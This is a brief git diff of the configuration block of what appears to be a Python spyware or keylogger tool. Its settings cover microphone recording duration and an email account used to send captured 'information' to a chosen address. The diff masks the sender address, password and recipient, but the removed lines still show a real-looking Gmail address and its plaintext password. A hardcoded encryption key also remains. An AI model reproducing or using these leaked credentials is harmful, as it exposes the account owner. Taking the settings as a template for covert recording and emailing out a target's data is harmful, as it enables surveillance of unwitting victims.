@@ -55,12 +55,12 @@ microphone_time = 30
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "arinzejustinng@gmail.com"  # Enter disposable email here
-password = "arinzejustinng@#1"  # Enter email password here
+email_address = "****************"  # Enter your email here
+password = "************"  # Enter email password here
 
 username = getpass.getuser()
 
-toaddr = "me@arinzejustinng.com.ng"  # Enter the email address you want to send your information to
+toaddr = "*************"  # Enter the email address you want to send your information to
 
 key = "6JkAHeppLqFCJ1RHLSrxm6K37285l96OmdjiGt00wZg="  # Generate an encryption key from the Cryptography folder
 
